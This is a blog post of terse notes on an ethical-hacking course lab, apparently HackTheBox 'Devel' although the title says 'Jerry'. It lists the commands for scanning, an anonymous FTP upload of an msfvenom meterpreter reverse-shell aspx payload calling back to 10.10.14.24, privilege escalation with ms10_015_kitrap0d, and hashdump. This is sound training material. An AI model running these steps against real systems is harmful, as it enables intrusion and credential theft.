---
layout:     post
title:      TCM PEH Hacking Jerry Notes
date:       2021-03-16
summary:    TheCyberMentor's Practical Ethical Hacking course mid-course capstone, hacking HackTheBox Jerry
categories: certs
thumbnail: cogs
tags:
 - certs
 - pwned
---
<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Devel_0"></a>HTB Devel</h2>
<p class="has-line-data" data-line-start="2" data-line-end="8">nmap -T4 -A -p- 10.10.10.5<br>
Noted port 21 open<br>
Noted possible web root dir at port 21 contents<br>
Noted port 80<br>
Noted possible default page at port 80<br>
Noted Windows OS</p>
<hr>
<p class="has-line-data" data-line-start="9" data-line-end="21">Visited <a href="http://10.10.10.5:80">http://10.10.10.5:80</a><br>
view source<br>
Noted confirmed default webpage IIS7<br>
dirbuster&amp;<br>
<a href="http://10.10.10.5:80">http://10.10.10.5:80</a><br>
check more threads<br>
usr/share/wordlist/dirbuster/*small.txt<br>
check directories<br>
check files<br>
check recurse<br>
file extention asm, asmx, asp, aspx, txt, zip, bak, rar<br>
start</p>
<hr>
<p class="has-line-data" data-line-start="22" data-line-end="32">cd Desktop<br>
ftp 10.10.10.5<br>
anonymous<br>
anonymous<br>
help<br>
ls<br>
pwd<br>
put dog.jpg<br>
ls<br>
Noted it did copy in dog.jpg</p>
<hr>
<p class="has-line-data" data-line-start="33" data-line-end="43">Googled msfvenom, looked for .asp payload format<br>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx &gt; ex.aspx<br>
msfconsole<br>
use exploit/multi/handler<br>
options<br>
set payload windows/meterpreter/reverse_tcp<br>
options<br>
set LHOST 10.10.14.24<br>
set LPORT 4444<br>
run</p>
<hr>
<p class="has-line-data" data-line-start="44" data-line-end="49">ftp 10.10.10.5<br>
anynomous<br>
anonymous<br>
binary<br>
put ex.aspx</p>
<hr>
<h2 class="code-line" data-line-start=50 data-line-end=52 ><a id="http1010105exaspx_50"></a><a href="http://10.10.10.5/ex.aspx">http://10.10.10.5/ex.aspx</a></h2>
<p class="has-line-data" data-line-start="52" data-line-end="86">In metasploit<br>
sysinfo<br>
getuid<br>
Noted not root<br>
hashdump<br>
getsystem<br>
background<br>
search suggester<br>
use post/multi/recon/local_exploit_suggester<br>
set session 1<br>
exploit<br>
use /exploit/windows/local/ms10_015_kitrap0d<br>
options<br>
set session 1<br>
options<br>
exploit<br>
Noted failed, but more options will show now<br>
options<br>
set LHOST 10.10.14.24<br>
set LPORT 4445<br>
exploit<br>
Note failed because listener died<br>
use exploit/multi/handler<br>
options<br>
run<br>
background<br>
use /exploit/windows/local/ms10_015_kitrap0d<br>
set session 2<br>
options<br>
exploit<br>
Noted meterpreter shell<br>
getuid<br>
Noted root<br>
hashdump</p>